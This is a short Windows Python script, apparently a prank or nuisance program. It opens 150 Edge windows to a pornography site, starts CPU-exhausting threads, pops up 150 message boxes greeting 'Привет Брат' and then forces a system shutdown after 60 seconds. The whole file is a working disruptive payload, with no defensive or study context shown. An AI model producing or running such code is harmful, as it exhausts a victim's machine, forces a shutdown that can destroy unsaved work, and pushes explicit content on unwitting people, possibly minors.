import os
import subprocess
import time
import ctypes
import threading
import math

def cpu_stress():
    while True:
        [math.factorial(x) for x in range(1000)]

edge_path = r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"
url = "https://rt.pornhub.com"

for _ in range(150):
    subprocess.Popen([edge_path, url, "--new-window"])
    threading.Thread(target=cpu_stress, daemon=True).start()
    time.sleep(0.01)

for _ in range(150):
    ctypes.windll.user32.MessageBoxW(0, "Привет Брат", "Привет Брат", 0x10)
    threading.Thread(target=cpu_stress, daemon=True).start()
    time.sleep(0.01)

os.system("shutdown /s /t 60")